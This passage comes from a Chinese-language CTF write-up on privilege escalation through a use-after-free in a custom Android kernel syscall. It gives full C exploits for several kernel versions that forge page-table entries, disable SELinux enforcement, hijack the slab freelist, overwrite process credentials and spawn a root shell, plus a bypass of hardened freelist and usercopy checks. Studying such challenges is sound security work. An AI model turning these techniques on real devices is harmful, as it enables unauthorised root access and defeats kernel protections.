9); // bits[9], SH[1]\n    d_block |= 0x40; // bits[7:6], AP[2:1] = 01\n    d_block |= 0x20; // bits[5], NS\n    d_block |= 0x10; // bits[2:0], AttrIndx[2:0]\n    d_block |= (kernel_phys & 0x0000ffffc0000000); // bits[47:30], output address\n    /* Upper attributes */\n    d_block |= (1ul << 52); // bits[52], Contiguous\n    d_block |= (1ul << 53); // bits[53], PXN\n    d_block |= (1ul << 54); // bits[54], XN\n\n    printf(\"d_block = 0x%lx\\n\", d_block);\n}\n\n\nvoid* write_pipe(void* arg){\n// WRITE CONTENT    \n    unsigned long cont_buffer[2] = {0}; \n    cont_buffer[0] = d_block;\n    cont_buffer[1] = d_block;\n\n// WRITE TARGET_ADDR\n    unsigned long target_addr[2] = {0};\n    target_addr[0] = d_block_addr;\n    target_addr[1] = 0x10;\n\n    sleep(3);\n\n    edit_buffer(target_addr, 0x10, UAF_INDEX);\n    printf(\"child: write to pipe\\n\");\n    write(pipe_fd[1], cont_buffer, 0x10);\n\n    hexdump(target_addr, 0x10);\n    hexdump(cont_buffer, 0x10);\n    printf(\"child: exit\\n\");\n    return 0;\n}\n\n\nint main(){\n    init_mirror(IMAGE_PHYS_ADDR, RE_MAP_ADDR);\n\n    pthread_t thr_write;\n    pthread_create(&thr_write, NULL, write_pipe, NULL);\n\n    void* test_addr = malloc(0x200);\n\n    struct iovec iovec_arr[IOVEC_NUM] = {0};           // heap size: 0x10*17=272\n    pipe(pipe_fd);\n    memset(iovec_arr, 0x0, sizeof(iovec_arr));\n    printf(\"sizeof(iovec_arr): %d\\n\", sizeof(iovec_arr));\n    iovec_arr[0].iov_base = test_addr;\n    iovec_arr[0].iov_len = 0x10;\n\n    new_buffer(UAF_INDEX);\n    del_buffer(UAF_INDEX);\n\n    // unsigned long target_addr[2] = {0};\n    // target_addr[0] = 0xFFFFFFC000618AB0;\n    // target_addr[1] = 0x10;\n    // edit_buffer(target_addr, 0x10, UAF_INDEX);\n\n    readv(pipe_fd[0], iovec_arr, IOVEC_NUM);\n\n    printf(\"read pipe: 0x%lx 0x%lx\\n\", *(unsigned long*)test_addr, *(unsigned long*)(test_addr+0x8));\n\n    // printf(\"d_block_addr: 0x%lx, *d_block_addr: 0x%lx\\n\",d_block_addr, *(unsigned long*)d_block_addr);\n\n    pthread_join(thr_write, NULL);\n\n// write kernel image\n    /* selinux_enforcing*/\n    unsigned long selinux_enforcing_addr_new = RE_MAP_ADDR + 0x80000 + (selinux_enforcing_addr - IMAGE_BASE);\n    *(int*)selinux_enforcing_addr_new = 0x0;\n\n    /* sys_setresuid*/\n    unsigned long setresuid_if_addr = 0xFFFFFFC0000AF650;\n    unsigned long setresuid_if_addr_new = RE_MAP_ADDR + 0x80000 + (setresuid_if_addr - IMAGE_BASE);\n    *(char *)(setresuid_if_addr_new+3) = 0x34;\n    printf(\"setresuid_if_addr_new content: 0x%lx\\n\",*(unsigned long*)setresuid_if_addr_new);\n\n    /* sys_setresgid*/\n    unsigned long setresgid_if_addr = 0xFFFFFFC0000AF8B0;\n    unsigned long setresgid_if_addr_new = RE_MAP_ADDR + 0x80000 + (setresgid_if_addr - IMAGE_BASE);\n    *(char *)(setresgid_if_addr_new+3) = 0x35;\n    printf(\"setresgid_if_addr_new content: 0x%lx\\n\",*(unsigned long*)setresgid_if_addr_new);\n\n\n    setresuid(0,0,0);\n    setresgid(0,0,0);\n\n    system(\"/system/bin/sh\");\n\n    printf(\"exit\\n\");\n    return 0;\n}\n```\n\n\n\n\n\n## android 9\n\n> 内核版本：linux 3.18.94\n\nexp如下\n\n```c\n#define _GNU_SOURCE\n#include <pthread.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <netinet/ip.h>\n#include <sys/syscall.h>\n#include <sys/mman.h>\n#include <sys/uio.h>\n#include <sys/resource.h>\n#include <string.h>\n#include <fcntl.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <linux/net.h>\n#include <errno.h>\n#include <signal.h>\n\n#define SYS_UAF 602\n\nunsigned long arg1, arg2, arg3;\n\n\nvoid* new_buffer(int idx){\n    void* ret = 0;\n    arg3 = ((idx &0xff)<<8)|(0&0xff);\n    // printf(\"arg3: 0x%lx\\n\", arg3);\n    ret = syscall(SYS_UAF, 0, 0, arg3);\n    return ret;\n}\n\nvoid del_buffer(int idx){\n    arg3 = ((idx &0xff)<<8)|(1&0xff);\n    // printf(\"arg3: 0x%lx\\n\", arg3);\n    syscall(SYS_UAF, 0, 0, arg3);\n}\n\nvoid show_buffer(void* addr, unsigned long len, int idx){\n    arg1 = addr;\n    arg2 = len;\n    arg3 = ((idx &0xff)<<8)|(2&0xff);\n    // printf(\"arg3: 0x%lx\\n\", arg3);\n    syscall(SYS_UAF, arg1, arg2, arg3);\n}\n\nvoid edit_buffer(void* addr, unsigned long len, int idx){\n    arg1 = addr;\n    arg2 = len;\n    arg3 = ((idx &0xff)<<8)|(3&0xff);\n    // printf(\"arg3: 0x%lx\\n\", arg3);\n    syscall(SYS_UAF, arg1, arg2, arg3);\n}\n\n// void call(int idx){\n//     arg3 = ((idx &0xff)<<8)|(4&0xff);\n    // printf(\"arg3: 0x%lx\\n\", arg3);\n//     syscall(SYS_UAF, arg1, arg2, arg3);\n// }\n\n\n#ifndef HEXDUMP_COLS\n#define HEXDUMP_COLS 16\n#endif\n\nvoid hexdump(void *mem, unsigned int len) {\n    putchar('\\n');\n    for(int i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++) {\n        /* print offset */\n        if(i % HEXDUMP_COLS == 0) {\n            printf(\"0x%06x: \", i);\n        }\n\n        /* print hex data */\n        if(i < len) {\n            printf(\"%02x \", 0xFF & ((char*)mem)[i]);\n        }\n        /* end of block, just aligning for ASCII dump */\n        else {        \n            printf(\"   \");\n        }\n\n        /* print ASCII dump */\n        if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1)) {\n            for(int j = i - (HEXDUMP_COLS - 1); j <= i; j++) {\n                 /* end of block, not really printing */\n                if(j >= len) {\n                    putchar(' ');\n                }\n                /* printable char */\n                else if(isprint(((char*)mem)[j])) {\n                    putchar(0xFF & ((char*)mem)[j]);\n                }\n                 /* other char */\n                else {\n                    putchar('.');\n                }\n            }\n            putchar('\\n');\n        }\n    }\n    putchar('\\n');\n}\n\n\nunsigned long SYMBOL__swapper_pg_dir = 0xFFFFFFC000A01000;\n\n#define IOVEC_NUM 17\n#define UAF_INDEX 6\n#define IMAGE_PHYS_ADDR 0x40080000\n#define RE_MAP_ADDR 0xFFFFFFC200000000\n#define IMAGE_BASE 0xFFFFFFC000080000\n// #define WRITE_ADDR 0xFFFFFFC000618AB0\n// #define WRITE_SIZE 0x8\nunsigned long selinux_enforcing_addr = 0xFFFFFFC0009C33B4;\n\nint pipe_fd[2];\nunsigned long d_block_addr;\nunsigned long d_block;\n\n\nvoid init_mirror(unsigned long kernel_phys, unsigned long mirror_base) {\n    int index1 = (mirror_base & 0x0000007fc0000000) >> 30; // bits[39:31]\n    d_block_addr = SYMBOL__swapper_pg_dir + index1 * 8;  // target Table Descriptor Address\n    printf(\"descriptor: 0x%lx + %d x 8 = 0x%lx\\n\", SYMBOL__swapper_pg_dir, index1, d_block_addr);\n\n    d_block = 0;\n    d_block |= 0x1 ; // Block entry\n    /* Lower attributes */\n    d_block |= (1u << 11); // bits[11], nG\n    d_block |= (1u << 10); // bits[10], AF\n    d_block |= (1u << 9); // bits[9], SH[1]\n    d_block |= 0x40; // bits[7:6], AP[2:1] = 01\n    d_block |= 0x20; // bits[5], NS\n    d_block |= 0x10; // bits[2:0], AttrIndx[2:0]\n    d_block |= (kernel_phys & 0x0000ffffc0000000); // bits[47:30], output address\n    /* Upper attributes */\n    d_block |= (1ul << 52); // bits[52], Contiguous\n    d_block |= (1ul << 53); // bits[53], PXN\n    d_block |= (1ul << 54); // bits[54], XN\n    printf(\"d_block = 0x%lx\\n\", d_block);\n}\n\n\nvoid* write_pipe(void* arg){\n// WRITE CONTENT    \n    unsigned long cont_buffer[2] = {0}; \n    cont_buffer[0] = d_block;\n    cont_buffer[1] = d_block;\n\n// WRITE TARGET_ADDR\n    unsigned long target_addr[2] = {0};\n    target_addr[0] = d_block_addr;\n    target_addr[1] = 0x10;\n\n    sleep(3);\n\n    edit_buffer(target_addr, 0x10, UAF_INDEX);\n    printf(\"child: write to pipe\\n\");\n    write(pipe_fd[1], cont_buffer, 0x10);\n\n    hexdump(target_addr, 0x10);\n    hexdump(cont_buffer, 0x10);\n    printf(\"child: exit\\n\");\n    return 0;\n}\n\n\n\nint main(){\n    init_mirror(IMAGE_PHYS_ADDR, RE_MAP_ADDR);\n\n    pthread_t thr_write;\n    pthread_create(&thr_write, NULL, write_pipe, NULL);\n\n    void* test_addr = malloc(0x200);\n\n    struct iovec iovec_arr[IOVEC_NUM] = {0};           // heap size: 0x10*17=272\n    pipe(pipe_fd);\n    memset(iovec_arr, 0x0, sizeof(iovec_arr));\n    printf(\"sizeof(iovec_arr): %d\\n\", sizeof(iovec_arr));\n    iovec_arr[0].iov_base = test_addr;\n    iovec_arr[0].iov_len = 0x10;\n\n    new_buffer(UAF_INDEX);\n    del_buffer(UAF_INDEX);\n\n    // unsigned long target_addr[2] = {0};\n    // target_addr[0] = 0xFFFFFFC000618AB0;\n    // target_addr[1] = 0x10;\n    // edit_buffer(target_addr, 0x10, UAF_INDEX);\n\n    readv(pipe_fd[0], iovec_arr, IOVEC_NUM);\n\n    printf(\"read pipe: 0x%lx 0x%lx\\n\", *(unsigned long*)test_addr, *(unsigned long*)(test_addr+0x8));\n\n    // printf(\"d_block_addr: 0x%lx, *d_block_addr: 0x%lx\\n\",d_block_addr, *(unsigned long*)d_block_addr);\n\n    pthread_join(thr_write, NULL);\n\n// write kernel image\n    /* selinux_enforcing*/\n    unsigned long selinux_enforcing_addr_new = RE_MAP_ADDR + 0x80000 + (selinux_enforcing_addr - IMAGE_BASE);\n    *(int*)selinux_enforcing_addr_new = 0x0;\n\n    /* sys_setresuid*/\n    unsigned long setresuid_if_addr = 0xFFFFFFC0000AF260;\n    unsigned long setresuid_if_addr_new = RE_MAP_ADDR + 0x80000 + (setresuid_if_addr - IMAGE_BASE);\n    *(char *)(setresuid_if_addr_new+3) = 0x34;\n    printf(\"setresuid_if_addr_new content: 0x%lx\\n\",*(unsigned long*)setresuid_if_addr_new);\n\n    /* sys_setresgid*/\n    unsigned long setresgid_if_addr = 0xFFFFFFC0000AF4C0;\n    unsigned long setresgid_if_addr_new = RE_MAP_ADDR + 0x80000 + (setresgid_if_addr - IMAGE_BASE);\n    *(char *)(setresgid_if_addr_new+3) = 0x35;\n    printf(\"setresgid_if_addr_new content: 0x%lx\\n\",*(unsigned long*)setresgid_if_addr_new);\n\n\n    setresuid(0,0,0);\n    setresgid(0,0,0);\n\n    system(\"/system/bin/sh\");\n\n    printf(\"exit\\n\");\n    return 0;\n}\n```\n\n\n\n## android 10\n\n>  内核版本：linux 4.14.175\n\n这个题竟然忘了最最基础的UAF的利用，不需要找目标大小的堆块，因为堆块内部的内容天然可以任意读写。那么直接改freelist链表，就能达到任意地址写。\n\n```\nmalloc -> free -> 改 -> malloc -> malloc\n最后一次malloc得到的是“改”的地址，于是对最后一次malloc得到的堆块读写，就相当于任意地址读写\n```\n\n此时，为了防止再次申请时系统崩溃，需要调整一下 kmalloc-512 空闲堆块指向的内容，使其指向一个合法堆块（通过free），并设置该堆块下一个指向为空（将堆块前8字节置0）。\n\n结合 [星盟安全的wp](https://mp.weixin.qq.com/s/tkZnkxrkhm7TrFzlbrHhZg) 思路：\n\n- 有了一次任意地址写后，由于本题的特殊性，可以将伪造的堆块fake_heap指向bss段的 gst1（0xffffff8008e9bfb0），这样就可以通过 `edit_buffer(xx, xx, 2) + show_buffer(xx, xx, 0)` 达到任意地址读，通过 `edit_buffer(xx, xx, 2) + edit_buffer(xx, xx, 0)` 达到任意地址写。从而构造出无数次任意地址读写（封装一个aaw和一个aar）。\n\n- 利用这一次任意地址写，写bss段的gst1，，然后遍历 `init_task->tasks.next` 和比较各个 `task_struct->comm` ，寻找名字为 “exp” 的项（反向查找更快），对应就是当前进程 “exp” 的task_struct，从而获得当前进程的cred地址。\n- 覆写cred内容（或者覆写 task_struct->cred 为 init_cred），即可提权。\n\n\n\nexp如下\n\n```c\n#define _GNU_SOURCE\n#include <pthread.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <netinet/ip.h>\n#include <sys/syscall.h>\n#include <sys/mman.h>\n#include <sys/uio.h>\n#include <sys/resource.h>\n#include <string.h>\n#include <fcntl.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <linux/net.h>\n#include <errno.h>\n#include <signal.h>\n\n#define SYS_UAF 602\n\nunsigned long arg1, arg2, arg3;\n\n\nvoid* new_buffer(int idx){\n    void* ret = 0;\n    arg3 = ((idx &0xff)<<8)|(0&0xff);\n    // printf(\"arg3: 0x%lx\\n\", arg3);\n    ret = syscall(SYS_UAF, 0, 0, arg3);\n    return ret;\n}\n\nvoid del_buffer(int idx){\n    arg3 = ((idx &0xff)<<8)|(1&0xff);\n    // printf(\"arg3: 0x%lx\\n\", arg3);\n    syscall(SYS_UAF, 0, 0, arg3);\n}\n\nvoid show_buffer(void* addr, unsigned long len, int idx){\n    arg1 = addr;\n    arg2 = len;\n    arg3 = ((idx &0xff)<<8)|(2&0xff);\n    // printf(\"arg3: 0x%lx\\n\", arg3);\n    syscall(SYS_UAF, arg1, arg2, arg3);\n}\n\nvoid edit_buffer(void* addr, unsigned long len, int idx){\n    arg1 = addr;\n    arg2 = len;\n    arg3 = ((idx &0xff)<<8)|(3&0xff);\n    // printf(\"arg3: 0x%lx\\n\", arg3);\n    syscall(SYS_UAF, arg1, arg2, arg3);\n}\n\n\n\n#ifndef HEXDUMP_COLS\n#define HEXDUMP_COLS 16\n#endif\n\nvoid hexdump(void *mem, unsigned int len) {\n    putchar('\\n');\n    for(int i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++) {\n        /* print offset */\n        if(i % HEXDUMP_COLS == 0) {\n            printf(\"0x%06x: \", i);\n        }\n\n        /* print hex data */\n        if(i < len) {\n            printf(\"%02x \", 0xFF & ((char*)mem)[i]);\n        }\n        /* end of block, just aligning for ASCII dump */\n        else {        \n            printf(\"   \");\n        }\n\n        /* print ASCII dump */\n        if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1)) {\n            for(int j = i - (HEXDUMP_COLS - 1); j <= i; j++) {\n                 /* end of block, not really printing */\n                if(j >= len) {\n                    putchar(' ');\n                }\n                /* printable char */\n                else if(isprint(((char*)mem)[j])) {\n                    putchar(0xFF & ((char*)mem)[j]);\n                }\n                 /* other char */\n                else {\n                    putchar('.');\n                }\n            }\n            putchar('\\n');\n        }\n    }\n    putchar('\\n');\n}\n\n\n\nvoid aaw(unsigned long k_addr, void* u_addr, unsigned long len){\n    unsigned long gst1_idx_0 = k_addr;\n    edit_buffer(&gst1_idx_0, 8, 2);\n    edit_buffer(u_addr, len, 0);\n}\n\nvoid aar(unsigned long k_addr, void* u_addr, unsigned long len){\n    unsigned long gst1_idx_0 = k_addr;\n    edit_buffer(&gst1_idx_0, 8, 2);\n    show_buffer(u_addr, len, 0);\n}\n\n#define TASK_COMM_OFFSET 0x750\n#define TASK_TASKS_OFFSET 0x4a8\n#define TASK_CRED_OFFSET 0x748\n\nunsigned long get_exp_task(){\n    unsigned long init_task = 0xFFFFFF8008DBAF80;\n    unsigned long exp_task_addr = 0x0;\n    unsigned long task_now = init_task;\n    unsigned long temp_val[2] = {0x0};\n\n    int i = 0;\n    while( (exp_task_addr == 0)){\n        aar(task_now+TASK_TASKS_OFFSET, temp_val, 8);\n        task_now = temp_val[0]-TASK_TASKS_OFFSET;\n        printf(\"task_struct: 0x%lx\\n\",task_now);\n        if(task_now == init_task){\n            printf(\"[X] failed to find target task_struct!\\n\");\n            break;\n        }\n\n        aar(task_now+TASK_COMM_OFFSET, temp_val, 0x10);\n        printf(\"task_struct->comm: %s\\n\", temp_val);\n        if( !strcmp(temp_val, \"exp\") ){\n            exp_task_addr = task_now;\n            printf(\"find the task! task_struct: 0x%lx\\n\",task_now);\n        }\n        printf(\"\\n\");\n    }\n\n    return exp_task_addr;\n}\n\nint main(){\n/* prepare */\n    new_buffer(0);\n    del_buffer(0);\n\n    unsigned long fake_heap = 0xffffff8008e9bfb0;       //  <gst1>\n    edit_buffer(&fake_heap, 8, 0);\n\n    new_buffer(1);\n    new_buffer(2);\n\n    unsigned long zero_flag = 0;\n    del_buffer(0);\n    edit_buffer(&zero_flag, 8, 0);\n\n/* exploit */\n    unsigned long task_addr = get_exp_task();\n\n    unsigned long cred_addr = 0x0;\n    aar(task_addr+TASK_CRED_OFFSET, &cred_addr, 8);\n    printf(\"cred addr: 0x%lx\\n\",cred_addr);\n    char buf[0x20];\n    memset(buf,0x0,0x20);\n    aaw(cred_addr, (void*)buf, 0x20);\n\n    printf(\"get root shell\\n\");\n    system(\"/system/bin/sh\");\n\n    printf(\"sleeping\\n\");\n    sleep(10);\n\n    return 0;\n}\n```\n\n\n\n## android 11\n\n> 内核版本：linux 5.4.50\n\n当前版本内核中开启了freelist的两种保护措施\n\n```bash\nCONFIG_SLAB_FREELIST_RANDOM=y         # 多了一些操作，使申请新slab时，分配到的堆块顺序是随机的\nCONFIG_SLAB_FREELIST_HARDENED=y       # free的堆块，链入freelist时，写入堆头的是一个异或后的值（不再是简单的指向下一个可申请堆块）\n```\n\n\n\n### 确定free heap的排布规律\n\n如果被分配的堆块是随机的那肯定不好办了，好在题目给的空间很大，我们可以申请释放多次，通过调试来找找规律。\n\n代码如下，每五个堆块为一组，反复申请释放：\n\n```c\n// 0~4\n  for(i=0; i<5; i++){\n        new_buffer(i);\n    }\n    \n    for(i=0; i<5; i++){\n        del_buffer(i);\n    }\n// 5~9       \n    for(i=5; i<10; i++){\n        new_buffer(i);\n    }\n\n    for(i=5; i<10; i++){\n        del_buffer(i);\n    }    \n// 10~14\n    for(i=10; i<15; i++){\n        new_buffer(i);\n    }\n    \n    for(i=10; i<15; i++){\n        del_buffer(i);\n    }\n// 15~19       \n    for(i=15; i<20; i++){\n        new_buffer(i);\n    }\n\n    for(i=15; i<20; i++){\n        del_buffer(i);\n    }\n```\n\n以上逻辑执行完毕后，查看bss段gst1中堆块地址的规律：\n\n```bash\ngef➤  x/20gx 0xFFFFFFC011A4DF78\n0xffffffc011a4df78 <gst1>:      0xffffff804ea6da00      0xffffff804ea6d400\n0xffffffc011a4df88 <gst1+16>:   0xffffff804ea6d600      0xffffff804ea6c200\n0xffffffc011a4df98 <gst1+32>:   0xffffff804ea6de00      0xffffff804ea6de00\n0xffffffc011a4dfa8 <gst1+48>:   0xffffff804ea6c200      0xffffff804ea6d600\n0xffffffc011a4dfb8 <gst1+64>:   0xffffff804ea6d400      0xffffff804ea6da00\n0xffffffc011a4dfc8 <gst1+80>:   0xffffff804ea6da00      0xffffff804ea6d400\n0xffffffc011a4dfd8 <gst1+96>:   0xffffff804ea6d600      0xffffff804ea6c200\n0xffffffc011a4dfe8 <gst1+112>:  0xffffff804ea6de00      0xffffff804ea6de00\n0xffffffc011a4dff8 <gst1+128>:  0xffffff804ea6c200      0xffffff804ea6d600\n0xffffffc011a4e008 <gst1+144>:  0xffffff804ea6d400      0xffffff804ea6da00\n```\n\n可以看到，在打开了 `CONFIG_SLAB_FREELIST_RANDOM` 选项的情况下，第一次申请时，堆块地址不是依次递增的。但最后释放的堆块，依然是最先被分配出去，这点跟之前版本的情况一样。\n\n再看 `CONFIG_SLAB_FREELIST_HARDENED` 对 free heap 的影响，gdb中调试结果如下：\n\n```bash\ngef➤  x/2gx 0xffffff804ea6da00\n0xffffff804ea6da00:     0xff2559cece592bff      0xffffffc0102d3300\ngef➤  x/20gx 0xffffff804ea6d400\n0xffffff804ea6d400:     0xff2b59cece5929ff      0x6c646948051dc86a\ngef➤  x/2gx 0xffffff804ea6d600\n0xffffff804ea6d600:     0xff2959cece593dff      0x7672655304016dcc\ngef➤  x/2gx 0xffffff804ea6c200\n0xffffff804ea6c200:     0xff3d59cece5921ff      0x767265530437039c\ngef➤  x/2gx 0xffffff804ea6de00\n0xffffff804ea6de00:     0x00dea64e80ffffff      0x767265530430fe45\n```\n\nfree heap中存储的不是一个简单的地址了，而是一个奇怪的值，每个heap都不一样。这个奇怪的值是怎样计算得到的呢？\n\n- 参考源码中的实现：\n\n  ```c\n  void kfree(const void *objp)\n  {\n  \tstruct kmem_cache *c;\n  \t[...]\n  \t__cache_free(c, (void *)objp, _RET_IP_);\n  \tlocal_irq_restore(flags);\n  }\n  \n  static __always_inline void __cache_free(struct kmem_cache *cachep, void *objp,\n  \t\t\t\t\t unsigned long caller)\n  {\n  \t[...]\n  \t___cache_free(cachep, objp, caller);\n  }\n  \n  #ifdef CONFIG_KASAN_GENERIC\n  void ___cache_free(struct kmem_cache *cache, void *x, unsigned long addr)\n  {\n  \tdo_slab_free(cache, virt_to_head_page(x), x, NULL, 1, addr);\n  }\n  #endif\n  \n  static __always_inline void do_slab_free(struct kmem_cache *s,\n  \t\t\t\tstruct page *page, void *head, void *tail,\n  \t\t\t\tint cnt, unsigned long addr)\n  {\n  \tvoid *tail_obj = tail ? : head;\n  \tstruct kmem_cache_cpu *c;\n  \tunsigned long tid;\n  redo:\n  \t[...]\n  \tif (likely(page == c->page)) {\n  \t\tvoid **freelist = READ_ONCE(c->freelist);\n  \n  \t\tset_freepointer(s, tail_obj, freelist);\n  \t\t[...]\n  \t} else\n  \t\t__slab_free(s, page, head, tail_obj, cnt, addr);\n  \n  }\n  \n  static inline void set_freepointer(struct kmem_cache *s, void *object, void *fp)\n  {\n  \tunsigned long freeptr_addr = (unsigned long)object + s->offset;\n  \n  #ifdef CONFIG_SLAB_FREELIST_HARDENED\n  \tBUG_ON(object == fp); /* naive detection of double free or corruption */\n  #endif\n  \n  \t*(void **)freeptr_addr = freelist_ptr(s, fp, freeptr_addr);\n  }\n  \n  static inline void *freelist_ptr(const struct kmem_cache *s, void *ptr,\n  \t\t\t\t unsigned long ptr_addr)\n  {\n  #ifdef CONFIG_SLAB_FREELIST_HARDENED\n  \treturn (void *)((unsigned long)ptr ^ s->random ^\n  \t\t\tswab((unsigned long)kasan_reset_tag((void *)ptr_addr)));      // 释放堆块时，存入堆块中的值\n  #else\n  \treturn ptr;\n  #endif\n  }\n  \n  static inline void *kasan_reset_tag(const void *addr)\n  {\n  \treturn (void *)addr;\n  }\n  ```\n\n- 对应到IDA反汇编代码中，往释放堆块写值的逻辑\n\n  ```c\n  unsigned __int64 __fastcall kfree()\n  {\n    [...]\n    if ( result >= 0x11 )\n    {\n        [...]\n        while ( 1 )\n        {\n          [...]\n          else\n          {\n            [...]\n            *(_QWORD *)(*((unsigned int *)v6 + 8) + v7) = bswap64(*((unsigned int *)v6 + 8) + v7) ^ v20 ^ v6[54];      \n            [...]\n          }\n          [...]\n        }\n      [...]\n    }\n    [...]\n  }\n  ```\n\n  对应汇编代码\n\n  ```armasm\n  .kernel:FFFFFFC010406628                 REV             X11, X9\n  .kernel:FFFFFFC01040662C                 EOR             X11, X11, X8\n  .kernel:FFFFFFC010406630                 EOR             X10, X11, X10\n  .kernel:FFFFFFC010406634                 STR             X10, [X9]\n  ```\n\n  经调试，发现：\n\n  - x8 是 freelist 指向的第一个堆块虚拟地址 - 对应汇编中 v20\n  - x9 是当前正要释放的堆块虚拟地址 - 对应汇编中 *((unsigned int *)v6 + 8) + v7\n  - x10 为 0 - 对应汇编中 v6[54]\n\n因此，可以得出如下结论：**将当前free heap的地址进行反转，然后跟上一个free heap的地址进行异或操作，得到的值就是存储在当前free heap前8字节中的cookie。**\n\n```bash\n>>> hex(0xdaa64e80ffffff^0xffffff804ea6d400)\n'0xff2559cece592bff'\n>>> hex(0xd4a64e80ffffff^0xffffff804ea6d600)\n'0xff2b59cece5929ff'\n>>> hex(0xd6a64e80ffffff^0xffffff804ea6c200)\n'0xff2959cece593dff'\n>>> hex(0xc2a64e80ffffff^0xffffff804ea6de00)\n'0xff3d59cece5921ff'\n>>> hex(0xdea64e80ffffff^0x0)\n'0xdea64e80ffffff'\n```\n\n可以看到，计算结果跟上文gdb调试的结果一致。\n\n现在，要想劫持freelist，就必须知道堆块的地址。\n\n如何泄露当前堆块的地址呢？需要一个内含当前堆块地址且占用kmalloc-512堆块的结构体。\n\n\n\n### 合适大小的可用结构体\n\n在我之前收集的结构体中，没有这个大小的结构体可用。星盟他用的是 `struct tty_port` 。\n\n用户态执行 `open(\"dev/ptmx\",2);` 后，[pty_unix98_install()](https://elixir.bootlin.com/linux/v5.4.50/source/drivers/tty/pty.c#L738) 函数中，为 [struct tty_port](https://elixir.bootlin.com/linux/v5.4.50/source/include/linux/tty.h#L230) 申请一个 0x160 大小的堆块（kmalloc-512），调用路径如下：\n\n```c\nstatic int ptmx_open(struct inode *inode, struct file *filp)\n{\n\t[...]\n\ttty = tty_init_dev(ptm_driver, index);\n\t/* The tty returned here is locked so we can safely\n\t   drop the mutex */\n\t[...]\n}\n\nstruct tty_struct *tty_init_dev(struct tty_driver *driver, int idx)\n{\n\t[...]\n\tretval = tty_driver_install_tty(driver, tty);\n\t[...]\n}\n\nstatic int tty_driver_install_tty(struct tty_driver *driver, struct tty_struct *tty)\n{\n\treturn driver->ops->install ? driver->ops->install(driver, tty) :\n\t\ttty_standard_install(driver, tty);\n}\n\nstatic int pty_unix98_install(struct tty_driver *driver, struct tty_struct *tty)\n{\n\treturn pty_common_install(driver, tty, false);\n}\n\nstatic int pty_common_install(struct tty_driver *driver, struct tty_struct *tty,\n\t\tbool legacy)\n{\n\tstruct tty_port *ports[2];\n\t[...]\n\tports[0] = kmalloc(sizeof **ports, GFP_KERNEL);   // 为struct tty_port申请堆块，大小为0x160\n\tports[1] = kmalloc(sizeof **ports, GFP_KERNEL);\n\t[...]\n\ttty_port_init(ports[0]);\n\ttty_port_init(ports[1]);\n\t[...]\n}\n\nvoid tty_port_init(struct tty_port *port)\n{\n\tmemset(port, 0, sizeof(*port));\n\ttty_buffer_init(port);\n\t[...]\n}\n\nvoid tty_buffer_init(struct tty_port *port)\n{\n\tstruct tty_bufhead *buf = &port->buf;\n\t[...]\n\tbuf->head = &buf->sentinel;        // tty_port堆块的前8个字节存储着sentinel所在地址（指向当前堆块）\n\tbuf->tail = &buf->sentinel;\n\t[...]\n}\n\n/* 关键结构体定义 */\nstruct tty_port {\n\tstruct tty_bufhead\tbuf;\t\t/* Locked internally */\n  [...]\n};\n\nstruct tty_bufhead {\n\tstruct tty_buffer *head;\t/* Queue head */\n\tstruct work_struct work;\n\tstruct mutex\t   lock;\n\tatomic_t\t   priority;\n\tstruct tty_buffer sentinel;\n\tstruct llist_head free;\t\t/* Free queue head */\n\tatomic_t\t   mem_used;    /* In-use buffers excluding free list */\n\tint\t\t   mem_limit;\n\tstruct tty_buffer *tail;\t/* Active buffer */\n};\n```\n\n\n泄露堆地址后，做法大致同Android 10。除了copy_from_user和copy_to_user中多了一个检查，不允许将task_struct堆块中的内容拷贝到用户态（或往里写）。\n\n因此多了一步，用任意地址写绕过该检查的步骤。\n\n\n### task_struct不可读的绕过\n\n在此版本环境中（android 11，linux 5.4.50），通过任意地址读，读取task_struct信息时，内核会崩溃。查看log信息，发现如下错误：\n\n```bash\nusercopy: Kernel memory exposure attempt detected from SLUB object 'task_struct' (offset 1872, size 16)!\n```\n\n完整截图如下\n\n![image-20230918182753027](image-20230918182753027.png?size=600)\n\n定位到崩溃函数\n\n![image-20230918182814415](image-20230918182814415.png?size=600)\n\n跟踪父级函数\n\n![image-20230918182837423](image-20230918182837423.png?size=600)\n\n绕过崩溃的方法 - 将mem_section置0\n\n![image-20230918182901996](image-20230918182901996.png?size=600)\n\n\n### exp\n\n\n\n\n```c\n#define _GNU_SOURCE\n#include <pthread.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <netinet/ip.h>\n#include <sys/syscall.h>\n#include <sys/mman.h>\n#include <sys/uio.h>\n#include <sys/resource.h>\n#include <string.h>\n#include <fcntl.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <linux/net.h>\n#include <errno.h>\n#include <signal.h>\n#include <byteswap.h>\n\n#define SYS_UAF 602\n\nunsigned long arg1, arg2, arg3;\n\nunsigned long mem_section_addr = 0xFFFFFFC011A7A8A8;\nunsigned long mem_section_data = 0x0;\n\n\nvoid* new_buffer(int idx){\n    void* ret = 0;\n    arg3 = ((idx &0xff)<<8)|(0&0xff);\n    // printf(\"arg3: 0x%lx\\n\", arg3);\n    ret = syscall(SYS_UAF, 0, 0, arg3);\n    return ret;\n}\n\nvoid del_buffer(int idx){\n    arg3 = ((idx &0xff)<<8)|(1&0xff);\n    // printf(\"arg3: 0x%lx\\n\", arg3);\n    syscall(SYS_UAF, 0, 0, arg3);\n}\n\nvoid show_buffer(void* addr, unsigned long len, int idx){\n    arg1 = addr;\n    arg2 = len;\n    arg3 = ((idx &0xff)<<8)|(2&0xff);\n    // printf(\"arg3: 0x%lx\\n\", arg3);\n    syscall(SYS_UAF, arg1, arg2, arg3);\n}\n\nvoid edit_buffer(void* addr, unsigned long len, int idx){\n    arg1 = addr;\n    arg2 = len;\n    arg3 = ((idx &0xff)<<8)|(3&0xff);\n    // printf(\"arg3: 0x%lx\\n\", arg3);\n    syscall(SYS_UAF, arg1, arg2, arg3);\n}\n\nvoid aaw(unsigned long k_addr, void* u_addr, unsigned long len){\n    unsigned long gst1_idx_7 = k_addr;\n    edit_buffer(&gst1_idx_7, 8, 5);\n    edit_buffer(u_addr, 